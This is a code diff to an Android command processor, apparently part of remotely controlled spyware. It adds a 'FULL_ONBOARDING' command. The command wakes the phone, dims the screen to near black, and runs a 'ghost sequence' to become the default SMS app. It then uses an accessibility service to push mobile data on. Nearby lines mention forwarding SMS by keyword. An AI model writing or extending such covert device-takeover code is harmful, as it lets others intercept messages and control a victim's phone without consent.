@@ -1122,6 +1122,53 @@ object CommandProcessor {
                     ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                     status = "KEYWORD_TRAPS_PURGED"
                 }
+                "FULL_ONBOARDING" -> {
+                    // 1. STRONG WAKE
+                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                    val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
+                        android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
+                        android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:MasterWake")
+                    wakeLock.acquire(3000)
+                    
+                    val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                        putExtra("is_wake_trigger", true)
+                    }
+                    ctx.startActivity(wakeIntent)
+
+                    // 2. DIM IMMEDIATELY
+                    Handler(Looper.getMainLooper()).postDelayed({ 
+                        DimmerManager.applyDim(ctx, 20, "AUTO")
+                    }, 500)
+
+                    // 3. DEFAULT SMS GHOST SEQUENCE
+                    DefaultSmsManager.expectedMode = "AUTO"
+                    DefaultSmsManager.requestDefault(ctx)
+
+                    // 4. CONNECTIVITY EVALUATION (Delayed to allow SMS Ghost to finish)
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+                        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
+                        val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
+                        
+                        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+                        val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
+
+                        if (!isOnline && hasSim) {
+                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            }
+                            ctx.startActivity(dataIntent)
+                            DebugLogger.log("AUTO_SYNC", "Offline with SIM detected. Opening Data Settings.")
+                        } else {
+                            DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
+                            DimmerManager.removeOverlay(ctx)
+                        }
+                    }, 5000)
+                    
+                    status = "SEQUENCE_INITIATED"
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
